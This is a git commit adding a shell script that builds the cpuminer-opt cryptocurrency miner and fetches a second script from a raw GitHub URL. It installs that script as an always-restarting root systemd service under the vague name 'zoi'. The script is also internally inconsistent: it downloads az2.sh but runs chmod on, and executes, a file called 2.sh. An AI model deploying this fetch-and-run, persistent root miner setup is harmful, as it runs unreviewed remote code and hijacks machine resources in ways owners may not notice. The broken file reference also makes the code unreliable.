9493b7bc0113ecc5e3ab69bc43107330406171ca
fablebox <40538304+fablebox@users.noreply.github.com>
2018-07-17 16:15:24 +0000

    Create az1.sh

---
+++ thanhmlzz/az1.sh
@@ -0,0 +1,30 @@
+#!/bin/bash
+apt-get update && 
+apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
+sudo sysctl vm.nr_hugepages=128 &&
+cd /usr/local/src/ &&
+wget https://github.com/JayDDee/cpuminer-opt/archive/v3.8.3.1.tar.gz &&
+tar xvzf v3.8.3.1.tar.gz &&
+cd cpuminer-opt-3.8.3.1 &&
+wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/az2.sh &&
+chmod +x 2.sh &&
+./autogen.sh &&
+CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl &&
+make &&
+bash -c 'cat <<EOT >>/lib/systemd/system/zoi.service 
+[Unit]
+Description=zoi
+After=network.target
+[Service]
+ExecStart= /usr/local/src/cpuminer-opt-3.8.3.1/2.sh
+WatchdogSec=3600
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+systemctl daemon-reload &&
+systemctl enable zoi.service &&
+service zoi start
